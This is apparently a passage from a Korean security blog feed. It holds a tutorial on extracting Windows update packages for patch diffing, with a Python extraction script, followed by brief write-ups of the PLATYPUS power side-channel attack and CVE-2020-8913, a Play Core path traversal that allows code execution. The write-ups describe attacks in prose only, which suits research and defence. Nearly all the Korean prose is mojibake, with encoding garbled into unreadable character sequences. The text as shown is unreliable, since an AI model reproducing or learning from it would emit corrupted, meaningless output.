ì»´í“¨í„°ì—ì„œ ë‘ ê°œ íŒŒì¼ì˜ ì°¨ì´ë¥¼ ë³´ì—¬ì£¼ëŠ” ìš©ì–´ë‹¤. (Ex : git diff - Gitì˜ ì†ŒìŠ¤ì½”ë“œ difference í™•ì¸) ë°”ì´ë„ˆë¦¬ ë¶„ì„ ê¸°ë²•(Binary Diffing)ìœ¼ë¡œë„ ì“°ì´ëŠ”ë°, íŒ¨ì¹˜ ë˜ëŠ” ì—…ë°ì´íŠ¸ëœ ë°”ì´ë„ˆë¦¬ì™€ ê¸°ì¡´ ë°”ì´ë„ˆë¦¬ë¥¼ ë¹„êµí•´ì„œ ì–´ë–¤ ì½”ë“œê°€ ë³€ê²½ë˜ì—ˆëŠ”ì§€, ì–´ë–¤ í•¨ìˆ˜ê°€ ì¶”ê°€ë˜ê³  ì œê±°ë˜ì—ˆëŠ”ì§€ ë“± ë²„ì „ ë³„ ë°”ì´ë„ˆë¦¬ì˜ ì°¨ì´ì ì„ ì•Œ ìˆ˜ ìˆëŠ” ë¶„ì„ ê¸°ë²•ì´ë‹¤.</p></blockquote><p>í•œë§ˆë””ë¡œ ì–˜ë„¤ê°€ ë­ë¥¼ ì–´ë–»ê²Œ íŒ¨ì¹˜í–ˆë‚˜~ ë°”ë€ ë¶€ë¶„ë§Œ ì“± ë‘˜ëŸ¬ë³´ëŠ” ë¶„ì„ ê¸°ë²•ì…ë‹ˆë‹¤. ë³„ ê±° ì—†ì–´ ë³´ì´ì§€ë§Œ Diffingì„ í•˜ë©´ì„œ íŒ¨ì¹˜ë¡œ ì¸í•´ ë°œìƒí•œ ìƒˆë¡œìš´ ì·¨ì•½ì ì´ë‚˜, ê¸°ì¡´ ì·¨ì•½ì ì— ëŒ€í•´ ì ìš©í•œ íŒ¨ì¹˜ë¥¼ ìš°íšŒí•˜ëŠ” ìƒˆë¡œìš´ ë°©ë²• ë“±ì„ íš¨ìœ¨ì ìœ¼ë¡œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜¤ëŠ˜ì€ ì•ì„œ ë§í•œ ê²ƒì²˜ëŸ¼ Windows Update íŒ¨ì¹˜ë¥¼ ì¶”ì¶œí•˜ê³  ì¶”ì¶œí•œ ì—…ë°ì´íŠ¸ íŒŒì¼ì„ ì´ìš©í•´ Diffingì„ ì§„í–‰í•´ ë³¼ê²Œìš”.</p><h1 id="Windows-Update-Package"><a href="#Windows-Update-Package" class="headerlink" title="Windows Update Package"></a>Windows Update Package</h1><h2 id="Microsoft-Update-Catalog"><a href="#Microsoft-Update-Catalog" class="headerlink" title="Microsoft Update Catalog"></a>Microsoft Update Catalog</h2><p>ìœˆë„ìš°ëŠ” ì—…ë°ì´íŠ¸ íŒ¨í‚¤ì§€ë¥¼ ë°°í¬í•´ ì‹¤í–‰í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ íŒ¨ì¹˜ë¥¼ í•©ë‹ˆë‹¤.</p><p>Windows 10 ê¸°ì¤€ìœ¼ë¡œ ë²„ì „ ë³„ë¡œ ë‚˜ëˆ„ì–´ ë°°í¬í•˜ê³  ìˆìœ¼ë©° ì˜¤ëŠ˜ì€ ë‹¤ìŒ í™˜ê²½ì—ì„œ ì§„í–‰í•©ë‹ˆë‹¤.</p><pre><code class="hljs markdown">Windows 10 ver1903, 64bit</code></pre><p>ë²„ì „ì— ë”°ë¼ ë°›ì•„ì•¼ í•˜ëŠ” ì—…ë°ì´íŠ¸ íŒŒì¼ì´ ë‹¤ë¥´ë‹ˆ ì°¸ê³ í•˜ì‹œë©´ ë©ë‹ˆë‹¤!</p><p>ê¸°ë³¸ì ìœ¼ë¡œ ìœˆë„ìš°ëŠ” ìë™ ì—…ë°ì´íŠ¸ ë°©ì‹ì„ ì‚¬ìš©í•˜ì§€ë§Œ ìœˆë„ìš° ì¹´íƒˆë¡œê·¸ì—ì„œ ë…ë¦½ ì‹¤í–‰í˜• íŒ¨ì¹˜ íŒ¨í‚¤ì§€ë¥¼ ë°›ì•„ ìˆ˜ë™ ì„¤ì¹˜í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><p>ìœˆë„ìš° ì¹´íƒˆë¡œê·¸ : <a href="https://www.catalog.update.microsoft.com/Home.aspx">https://www.catalog.update.microsoft.com/Home.aspx</a></p><p>Windows ì¹´íƒˆë¡œê·¸ëŠ” ë‹¤ìŒê³¼ ê°™ì€ í˜•ì‹ì˜ ê²€ìƒ‰ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.</p><pre><code class="hljs lisp">YYYY-MM release-number (<span class="hljs-name">x86</span><span class="hljs-name">|x64|</span><span class="hljs-name">ARM64</span>) cumulative</code></pre><p>ì œ ìœˆë„ìš°ëŠ” 1903, 64bit ì´ë¯€ë¡œ 8ì›” ì—…ë°ì´íŠ¸ë¥¼ ì°¾ê¸° ìœ„í•´ ì•„ë˜ í‚¤ì›Œë“œë¡œ ê²€ìƒ‰ì„ í•´ë³¼ê²Œìš”.</p><pre><code class="hljs angelscript"><span class="hljs-number">2020</span><span class="hljs-number">-08</span> <span class="hljs-number">1903</span> x64 cumulative</code></pre><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/2.png"></p><p>ê²€ìƒ‰ì„ í•˜ë©´ ì´ë ‡ê²Œ ì—…ë°ì´íŠ¸ ëª©ë¡ë“¤ì´ ì£¼ë¥´ë¥µ ëœ¨ëŠ”ë°, Diffing í•˜ê¸¸ ì›í•˜ëŠ” íŒŒì¼ì´ íŒ¨ì¹˜ëœ ì—…ë°ì´íŠ¸ í•­ëª©ì„ ë°›ìœ¼ë©´ ë©ë‹ˆë‹¤. ì „ <code>KB4565351</code> ì„ ë°›ë„ë¡ í• ê²Œìš”.</p><h1 id="Extract-Update-Package"><a href="#Extract-Update-Package" class="headerlink" title="Extract Update Package"></a>Extract Update Package</h1><p>ì—…ë°ì´íŠ¸ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ë©´ <code>msu</code> í™•ì¥ëª…ì˜ ì—…ë°ì´íŠ¸ íŒ¨í‚¤ì§€ë¥¼ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ íŒ¨í‚¤ì§€ì—ì„œ íŒŒì¼ë“¤ì„ ì¶”ì¶œí•´ë‚´ë©´ ë©ë‹ˆë‹¤.</p><h2 id="Extract-msi"><a href="#Extract-msi" class="headerlink" title="Extract msi"></a>Extract msi</h2><p>PowerShellì—ì„œ <code>expand.exe -F:* &quot;[msu file name]&quot; .\\ext\\</code> ëª…ë ¹ì–´ë¡œ íŒ¨ì¹˜ ì»¨í…ì¸ ë“¤ì„ ì¶”ì¶œí•˜ë©´ ì•„ë˜ ì‚¬ì§„ê³¼ ê°™ì´ ext í´ë” ì•ˆì— ì¶”ì¶œëœ íŒŒì¼ë“¤ì´ ìˆëŠ” ê±¸ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤~</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/3.png"></p><p>cabíŒŒì¼ì´ ë³´ì´ëŠ”êµ°ìš”, ì´ê²ƒë„  ì—­ì‹œ expandë¡œ ì“±ì‹¹ ì¶”ì¶œí•˜ë„ë¡ í•˜ì£ !</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/4.png"></p><p>..?? ì™œ ì•„ë¬´ ë°˜ì‘ì´ ì—†ì§€..?</p><p>ì•„ ì™œ ì•ˆë˜ë‚˜ í–ˆë”ë‹ˆ ì¢€ ì˜¤ë˜ ê±¸ë¦¬ë‚˜ ë³´êµ°ìš” ê¸°ë‹¤ë ¤ ë´…ì‹œë‹¤ ã…</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/5.png"></p><p>ê·¸ë ‡ê²Œ <del>2000ë…„ ê°™ì€</del> í•œ ì‹œê°„ì´ ì§€ë‚˜ê³ .. í•œ 20ë¶„ ì •ë„ ê¸°ë‹¤ë¦¬ë‹¤ê°€ í¬ê¸°í•˜ê³  ì €ë… ë¨¹ê³  ì˜¤ë‹ˆê¹Œ ëë‚˜ ìˆë„¤ìš”?</p><p>ì•„ë‹ˆ ë­ ì¶”ì¶œ ì–¼ë§ˆë‚˜ í•œë‹¤ê³  ì´ë ‡ê²Œ ì˜¤ë˜ ê±¸ë¦¬ëƒ í•˜ê³  ì¶”ì¶œí•œ íŒŒì¼ ê°œìˆ˜ë¥¼ ì„¸ ë´¤ëŠ”ë°</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/6.png"></p><p>?? 3ë§Œê°œìš”?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/7.png"></p><p><em>ì•„ë‹ˆ ë¯¸ì¹œ ã…ã…</em></p><p>ëˆ„ì  ì—…ë°ì´íŠ¸ íŒ¨í‚¤ì§€ë¼ ì§€ê¸ˆê¹Œì§€ì˜ ì—…ë°ì´íŠ¸ë“¤ì´ ëª¨ë‘ í¬í•¨ë˜ì–´ ìˆì–´ ì´ë ‡ê²Œ ë§ë‹¤ê³  í•˜ë„¤ìš”â€¦? ì¶”ì¶œì€ ë°¥ë•Œ ë§ì¶°ì„œ ëŒë ¤ë†“ê³  ë°¥ ë¨¹ê³  ì˜¤ë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤ã…‹ã…‹;</p><h2 id="Extracted-files"><a href="#Extracted-files" class="headerlink" title="Extracted files"></a>Extracted files</h2><p><code>tree /F &gt;&gt; extract.txt</code> ëª…ë ¹ì–´ë¡œ ì–´ë–¤ íŒŒì¼ë“¤ì´ ì¶”ì¶œ ë˜ì—ˆëŠ”ì§€ íŠ¸ë¦¬ êµ¬ì¡°ë¡œ í™•ì¸í•´ ë³´ë„ë¡ í•˜ì£ !</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/8.png"></p><p>ë‹¤ì–‘í•œ í˜•ì‹ì˜ íŒŒì¼, í´ë”ë“¤ì´ ì¶”ì¶œëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆë„¤ìš”.</p><ol><li><p>í´ë” ìœ í˜•</p><p>ì ‘ë‘ì–´ë¡œ ì•„í‚¤í…ì²˜ê°€ ë¶™ìŒ</p><ul><li>amd64, x86, wow64, msil</li></ul></li><li><p>íŒŒì¼ ìœ í˜•</p><ul><li>manie</li><li>cat : ë³´ì•ˆ ì¹´íƒˆë¡œê·¸</li><li>mum : ì¹´íƒˆë¡œê·¸ íŒŒì¼ê³¼ ìŒì„ ì´ë£¨ë©° ë©”íƒ€ ë°ì´í„°ê°€ í¬í•¨ë¨</li></ul></li></ol><p>ê·¸ëŸ°ë°.. ê° íŒ¨ì¹˜ í´ë” ì•ˆì— fë‘ r í´ë”ê°€ ìˆê³ , ì´ ì•ˆì— ê°ê° ê°™ì€ ì´ë¦„ì˜ ë°”ì´ë„ˆë¦¬ê°€ ë³´ì´ëŠ”ë°, ì´ê²Œ ë­˜ê¹Œìš”..?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/9.png"></p><p>f, r ê° í´ë”ëŠ” Differential í´ë”ë¡œ, ì„¸ ê°€ì§€ ìœ í˜•ì´ ìˆìŠµë‹ˆë‹¤.</p><ul><li>f: forward differential</li><li>r: reverse differential</li><li>n: null differential</li></ul><p>ì´ë“¤ì€ ê¸°ë³¸ ë²„ì „ì—ì„œ ë³€ê²½ë  ì—…ë°ì´íŠ¸ íŒŒì¼ê³¼ì˜ ì°¨ì´ë§Œí¼ì˜ ë‚´ìš©ì„ ë‹´ê³  ìˆëŠ” íŒŒì¼ì…ë‹ˆë‹¤. ì´ ë¶€ë¶„ì€ ì¤‘ìš”í•œ ë‚´ìš©ì´ë¼ ë‚˜ì¤‘ì— ë‹¤ì‹œ ì§šì–´ ë³´ë„ë¡ í•  í…Œë‹ˆ, ê¼­ ê¸°ì–µí•´ ë‘ì„¸ìš”!</p><h2 id="WinSxS"><a href="#WinSxS" class="headerlink" title="WinSxS"></a>WinSxS</h2><p>WindowsëŠ” Windowsì™€ WinSxSë¥¼ í†µí•´ ë°”ì´ë„ˆë¦¬ë¿ë§Œ ì•„ë‹ˆë¼ ëª¨ë“  ì¢…ë¥˜ì˜ íŒŒì¼ì„ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>WinSxSëŠ” manifestë¥¼ ì°¸ì¡°í•´ íŒ¨ì¹˜í•˜ë©° manifestì—ëŠ” íŒ¨ì¹˜ ì ìš© ë°©ë²•, ê²°ê³¼ íŒŒì¼ì˜ ê¶Œí•œ, ì„¤ì •í•  ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ ë“± ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì „ë°˜ì ì¸ ë¦¬ìŠ¤íŠ¸ ì •ë³´ê°€ ìˆì–´ìš”. ê°„ë‹¨í•˜ê²Œ í™•ì¸í•´ ë³¼ê¹Œìš”?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/10.png"></p><p>Windows-Gaming-XboxLive-Storage-Service-Componentì— ëŒ€í•œ manifest ì •ë³´ë¥¼ ì¡°íšŒí•œ ê²°ê³¼ì…ë‹ˆë‹¤.</p><p>differential í´ë”ì¸ f, rê°€ ìˆê³ , ê°ê°ì— íŒ¨ì¹˜ë  dllê³¼ exe ë°”ì´ë„ˆë¦¬ê°€ ìˆëŠ” ê±¸ í™•ì¸í•  ìˆ˜ ìˆì–´ìš”.</p><h1 id="ì¶”ì¶œ-ìë™í™”"><a href="#ì¶”ì¶œ-ìë™í™”" class="headerlink" title="ì¶”ì¶œ ìë™í™”"></a>ì¶”ì¶œ ìë™í™”</h1><p>ê·¸ëŸ°ë° ë§ì…ë‹ˆë‹¤. ë‹¤ ì¢‹ì€ë°.. ì¶”ì¶œí•œ íŒŒì¼ ë¦¬ìŠ¤íŠ¸ë¥¼ ì¢€ ë³´ë ¤ê³  í–ˆë”ë‹ˆ ì•„í‚¤í…ì²˜ ë³„ë¡œ ë¶„ë¥˜ë„ ì—†ê³  ë’¤ì£½ë°•ì£½ ê°œíŒì´ë¼ ì§œì¦ ë‚˜ë ¤ê³  í•˜ë„¤,,^^</p><blockquote><p>ë‚ ë¡œ ë¨¹ê¸° ì¢‹ì•„í•˜ëŠ” L0chëŠ” ë°”ë¡œ ì¶”ì¶œ/ë¶„ë¥˜ ìë™í™” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§œê¸°ë¡œ í•©ë‹ˆë‹¤. ì—­ì‹œ ì› ê²Œì‹œê¸€ì—ë„ ìŠ¤í¬ë¦½íŠ¸ê°€ ìˆêµ°ìš”!<br>ê¸°ìœ í‘œì •ìœ¼ë¡œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚´í´ë³¸ L0chì˜ í‘œì •ì´ ì–´ë‘ì›Œì§‘ë‹ˆë‹¤. ë¬´ìŠ¨ ì¼ì´ì£ ? ì•„ ! íŒŒì›Œì‰˜ë¡œ ì§  ìŠ¤í¬ë¦½íŠ¸ë„¤ìš”!<br>ì €ëŸ°â€¦ ì• ì„í•˜ê²Œë„ L0chëŠ” íŒŒì›Œì‰˜ì„ í•´ë³¸ ì ì´ ì—†ìŠµë‹ˆë‹¤. ëˆˆë¬¼ì„ ë¨¸ê¸ˆê³  íŒŒì´ì¬ìœ¼ë¡œ ìƒˆë¡œ ì‘ì„±í•˜ëŠ” ë°©ë²•ë°–ì— ì—†ê² êµ°ìš”.</p></blockquote><pre><code class="hljs python"><span class="hljs-comment">#F**k PowerShell </span><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> timeps_path = <span class="hljs-string">&#x27;C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe &#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_dir</span>(<span class="hljs-params">dir</span>):</span><span class="hljs-keyword">try</span>:<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span>(os.path.isdir(dir)):os.makedirs(os.path.join(dir))<span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:<span class="hljs-keyword">if</span> e.errno != errno.EEXIST:print(<span class="hljs-string">&quot;Failed to create directory&quot;</span>)<span class="hljs-keyword">raise</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_msu</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;*.msu&quot; ./ext/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_cab</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;./ext/Windows*.cab&quot; ./patch/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">move_files</span>(<span class="hljs-params">dir, filename</span>):</span><span class="hljs-keyword">try</span>:os.popen(<span class="hljs-string">&#x27;move ./patch/&#x27;</span>+filename+<span class="hljs-string">&#x27; ./&#x27;</span>+dir)<span class="hljs-keyword">except</span>:print(<span class="hljs-string">&quot;Failed to move file&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">classification</span>():</span>output = os.popen(<span class="hljs-string">&#x27;dir /ad /b patch&#x27;</span>).read()patch_list = output.split(<span class="hljs-string">&#x27;\\n&#x27;</span>)print(<span class="hljs-string">&quot;File classification&quot;</span>)<span class="hljs-keyword">for</span> idx, patch <span class="hljs-keyword">in</span> enumerate(patch_list):<span class="hljs-keyword">if</span> idx + <span class="hljs-number">1</span> % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:print(<span class="hljs-string">&quot;(&quot;</span>+str(idx)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)time.sleep(<span class="hljs-number">0.01</span>)platform = patch[:<span class="hljs-number">5</span>]<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;msil&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;MSIL&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;wow64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;WOW64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;amd64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;x86&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x86&#x27;</span>, patch)print(<span class="hljs-string">&quot;(&quot;</span>+str(idx + <span class="hljs-number">1</span>)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)<span class="hljs-comment"># JUNK</span>os.popen(<span class="hljs-string">&#x27;move patch JUNK&#x27;</span>)os.popen(<span class="hljs-string">&#x27;cd ext &amp;&amp; move *.txt ../&#x27;</span>)os.popen(<span class="hljs-string">&#x27;echo y | rmdir /s ext &gt; nul&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:dir_list = [<span class="hljs-string">&#x27;ext&#x27;</span>,<span class="hljs-string">&#x27;patch&#x27;</span>,<span class="hljs-string">&#x27;MSIL&#x27;</span>,<span class="hljs-string">&#x27;WOW64&#x27;</span>,<span class="hljs-string">&#x27;x64&#x27;</span>,<span class="hljs-string">&#x27;x86&#x27;</span>]<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> dir_list:create_dir(d)extract_msu()extract_cab()classification()print(<span class="hljs-string">&quot;Done&quot;</span>)time.sleep(<span class="hljs-number">3</span>)</code></pre><p>PowerShell ì¨ë³´ë ¤ê³  í–ˆëŠ”ë° 10ë¶„ë§Œì— ë•Œë ¤ì¹˜ê³  ê± ìµìˆ™í•œ íŒŒì´ì¬ ì¼ìŠµë‹ˆë‹¤ã…‹ã…‹. ìµìˆ™í•œ ê²Œ ìµœê³ ì•¼</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/11.png"></p><blockquote><p>íŒŒì´ì¬ ìµœê³ ë‹¤ì•…!! </p></blockquote><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/12.png"></p><p>msuì—ì„œ cabíŒŒì¼ì„ ì¶”ì¶œí•˜ê³ , ìœ„ ì‚¬ì§„ê³¼ ê°™ì´ cabì—ì„œ ì¶”ì¶œí•œ íŒŒì¼ë“¤ì„ ê° ì•„í‚¤í…ì²˜ í´ë”ì— ë¶„ë¥˜í–ˆìŠµë‹ˆë‹¤.<br>.manifestì™€ .mum, .cat íŒŒì¼ì€ ë“¤ì—¬ë‹¤ë³¼ ì¼ì´ ê±°ì˜ ì—†ê¸° ë•Œë¬¸ì— JUNKë¡œ ë¶„ë¥˜ë¥¼ í–ˆêµ¬ìš”.</p><p>ì´ë ‡ê²Œ ë¶„ë¥˜í•´ì„œ ì •ë¦¬ëœ ëª¨ìŠµì„ ë³´ë‹ˆ í¸ì•ˆí•˜êµ°ìš”. ì—­ì‹œ ì‚¬ëŒì€ ì •ë¦¬ë¥¼ í•˜ê³  ì‚´ì•„ì•¼ ë¼<br>ì•„ ê·¸ë˜ì„œ ì œ ë°©ì€ ì •ë¦¬í•˜ê³  ì‚¬ëƒêµ¬ìš”? ê·¸ëŸ´ ë¦¬ê°€ìš”..?</p><p>ë¶„ëŸ‰ ì¡°ì ˆ ì‹¤íŒ¨ë¡œ.. ë‹¤ìŒ ê¸€ì—ì„œëŠ” íŒ¨ì¹˜ ìœ í˜•ì„ ì•Œì•„ë³´ê³ , ë³¸ê²©ì ìœ¼ë¡œ Diffingì„ í•´ë³¼ê²Œìš”!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/13.jpg"></p><p>ì•ˆë…•íˆ ê³„ì„¸ìš” ì—¬ëŸ¬ë¶„! ì „ ì´ ì„¸ìƒì˜ ëª¨ë“  êµ´ë ˆì™€ ì†ë°•ì„ ë²—ì–´ ë˜ì§€ê³  ì œ í–‰ë³µì„ ì°¾ì•„ ë– ë‚©ë‹ˆë‹¤! (ëŒ€ì¶© ìˆ  ë¨¹ìœ¼ëŸ¬ ê°„ë‹¤ëŠ” ë§)</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Software-based Power Side-Channel Attack on x86</title>
    <link href="/2020/11/14/fabu1ous/2020-11-14/"/>
    <url>/2020/11/14/fabu1ous/2020-11-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://platypusattack.com/">PLATYPUS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Xen</p><p>Intel Processor ë‹¤ìˆ˜</p><p>Linux</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>side-channel ì •ë³´(power consumption / electro magnetic emission)ë¥¼ ì´ìš©í•´ ì‹œìŠ¤í…œì˜ operation ë° dataë¥¼ ìœ ì¶”í•˜ëŠ” ê³µê²© ë°©ë²•ì€ ì„¸ê³„ 2ì°¨ ëŒ€ì „ ë•Œë¶€í„° ì¡´ì¬í–ˆìŠµë‹ˆë‹¤. ì§€ê¸ˆê¹Œì§€ 2ê°€ì§€ í•œê³„ê°€ ì¡´ì¬í–ˆëŠ”ë° ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>ê³ ì„±ëŠ¥ì˜ Desktopì´ë‚˜ serverìš© CPU ë³´ë‹¨ ì„ë² ë””ë“œ ë§ˆì´í¬ë¡œ ì»¨íŠ¸ë¡¤ëŸ¬ë¥¼ íƒ€ê²Ÿìœ¼ë¡œ ì¡ìŒ.</li><li>ì˜¤ì‹¤ë¡œìŠ¤ì½”í”„ ë“±ì„ ì´ìš©í•œ í•˜ë“œì›¨ì–´ ê¸°ë°˜ ê³µê²©ì´ ë§ì•˜ê³ , ì†Œí”„íŠ¸ì›¨ì–´ ê¸°ë°˜ ê³µê²©ì˜ x86 ì ìš©ì€ í¬ê²Œ ì„±ê³µì ì´ì§€ ëª»í•¨. ex) RSA key ë³µêµ¬ ì‹œë„ê°€ 2ë²ˆ ìˆì—ˆì§€ë§Œ ì‹¤íŒ¨.</li></ol><p>PLATYPUS attackì€ ì†Œí”„íŠ¸ì›¨ì–´ ê¸°ë°˜ side-channel ê³µê²©ì…ë‹ˆë‹¤. Intel RAPL interfaceì— ì ‘ê·¼í•´ power consumptionì— ëŒ€í•œ ì •ë³´ ì¶•ì  í›„ x86 ì‹œìŠ¤í…œì„ íƒ€ê²Ÿìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ í–‰ìœ„ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>instruction ë¶„ë³„, control flow monitoring</li><li>AES-NI key ì¶”ì¶œ(26ì‹œê°„ ì´ë‚´)</li><li>RSA key ë³µêµ¬(100ë¶„ ì´ë‚´)</li><li>KASLR ë¬´ë ¥í™”(20ì´ˆ ì´ë‚´)</li></ol><p>Intel RARL(Running Average Power Limit)ì˜ ë°ì´í„°ì— ëˆ„êµ¬ë‚˜ ì ‘ê·¼í•  ìˆ˜ ìˆê³  ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ power monitoring interfaceë“¤ì˜ ì ‘ê·¼ê¶Œí•œì´ íŒ¨ì¹˜ëìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://seclists.org/oss-sec/2020/q4/109">https://seclists.org/oss-sec/2020/q4/109</a></p><p><a href="https://seclists.org/oss-sec/2020/q4/110">https://seclists.org/oss-sec/2020/q4/110</a></p><p><a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html">https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html</a></p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>side-channel attack</tag>
      
      <tag>intel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Persistent arbitrary code execution in Android&#39;s Google Play Core Library</title>
    <link href="/2020/11/13/l0ch/2020-11-13/"/>
    <url>/2020/11/13/l0ch/2020-11-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/971386">CVE-2020-8913 - Persistent arbitrary code execution in Androidâ€™s Google Play Core Library</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android Play Core â‰¤ 1.7.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google APIë¥¼ í†µí•´ ì‚¬ìš©ìê°€ Play Storeì— ì ‘ê·¼í•˜ì§€ ì•Šê³  ì¸ì•± ì—…ë°ì´íŠ¸ë¥¼ í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” Play Core Libraryì—ì„œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ Play Core Libraryë¥¼ ì‚¬ìš©í•˜ëŠ” ëª¨ë“  ì•ˆë“œë¡œì´ë“œ ì•±ì„ ëŒ€ìƒìœ¼ë¡œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ë¶€ë¶„ì€ <code>SplitCompat.install</code> ë¡œ, ë™ì¼í•œ ê¸°ê¸°ì— ì„¤ì¹˜ëœ íƒ€ì‚¬ ì•±ì´ ì„ì˜ì˜ ë°ì´í„°ë¥¼ broadcast í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³¼ì •ì—ì„œ <code>split_id</code> ì— ëŒ€í•œ ìœ íš¨ì„± ê²€ì‚¬ê°€ ì—†ì–´ path traversalë¥¼ í†µí•´ ì›í•˜ëŠ” ìœ„ì¹˜ì— ì„ì˜ì˜ íŒŒì¼ì„ ë³µì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë•Œ ì„ì˜ ì½”ë“œë¥¼ í¬í•¨í•˜ê³  íŒŒì¼ëª…ì´  <code>config.</code> ë¡œ ì‹œì‘í•˜ëŠ” íŒŒì¼ì„  <code>verified-splits</code> ê²½ë¡œì— ë³µì‚¬í•˜ë©´  íŒŒì¼ì´ ì•±ì˜ ëŸ°íƒ€ì„ ClassLoaderì— 